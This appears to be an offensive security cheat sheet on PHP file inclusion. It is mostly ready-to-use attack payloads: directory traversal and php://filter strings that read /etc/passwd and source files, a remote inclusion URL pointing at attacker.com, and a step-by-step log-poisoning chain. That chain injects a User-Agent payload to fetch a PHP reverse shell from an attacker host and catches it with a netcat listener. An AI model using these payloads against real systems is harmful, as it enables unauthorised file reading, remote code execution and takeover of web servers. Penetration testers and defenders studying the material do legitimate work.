---
title: File Inclusion
desc: 
tags: [Burp, LFI, Netcat, Reverse Shell, RFI, Web]
alts: [Directory-Traversal, Reverse-Shell]
render_with_liquid: false
---

## 1. Local File Inclusion (LFI)

```sh
/index.php?page=/etc/passwd
/index.php?page=../../../../etc/passwd
/index.php?page=../../../../../etc/passwd
/index.php?page=..//..//..//..//..//etc/passwd
/index.php?page=../../../../../../../../../../../../../../etc/passwd
/index.php?page=..%5c..%5c..%5c..%5cetc/passwd
/index.php?page=..%252f..%252f..%252f..%252fetc/passwd
/index.php?page=/etc/passwd%00
/index.php?page=/etc/passwd%00.inc
/index.php?page=/etc/passwd%00.php
/index.php?page=http://localhost/index
/index.php?page=http:%5c%5cindex
/index.php?page=http:%252f%252findex
/index.php?page=somedir/../../../../etc/passwd&ext=

# PHP Filter
/index.php?page=php://filter/resource=/etc/passwd
/index.php?page=php://filter/read=string.rot13/resource=index.php
/index.php?page=php://filter/convert.base64-encode/resource=index.php
/index.php?page=pHp://filter/convert.base64-encode/resource=index.php
/index.php?page=php://filter/zlib.deflate/convert.base64-encode/resource=/etc/passwd
/index.php?page=data://text/plain,<?php echo base64_encode(file_get_contents(“index.php”)); ?>

# Windows
/index.php?page=../../../../../../../../windows/system32/drivers/etc/hosts
```

<br />

## 2. Remote File Inclusion (RFI)

```
/index.php?page=//attacker.com/exploit
```

<br />

## 3. Log Poisoning

1. **Check if You Can Access the Apache Log File**

    ```
    /index.php?page=../../../../var/log/apache2/access.log
    ```

2. **Prepare the Payload for PHP Reverse Shell**

    ```sh
    wget https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php -O shell.php

    # Edit the values in the payload
    $ip = '<attacker-ip>';
    $port = 4444;
    ```

3. **Open Web Server in Your Local Machine**

    By doing so, 

    ```sh
    python -m http.server 80
    ```

4. **Inject PHP Payload in the User-Agent**

    Send the GET Request with abusing the User-Agent.  
    The payload can be uploaded to the "/shell.php" of the target website.

    ```
    GET / HTTP/1.1
    ...
    User-Agent: <?php file_put_contents('shell.php', file_get_contents('http://<attacker-ip>/shell.php'));  ?>
    ```

5. **Apply the Injection**

    To do so, refresh the page "/index.php?page=../../../../var/log/apache2/access.log".

6. **Open Listener for Reverse Shell**

    In you local machine, open the listener.  
    You need to specify the port which you set the section 2.

    ```sh
    nc -lvnp 4444
    ```

7. **Gain Access to Shell**

    Access to "/shell.php" of the target website.  
    If it goes well, you can get a shell.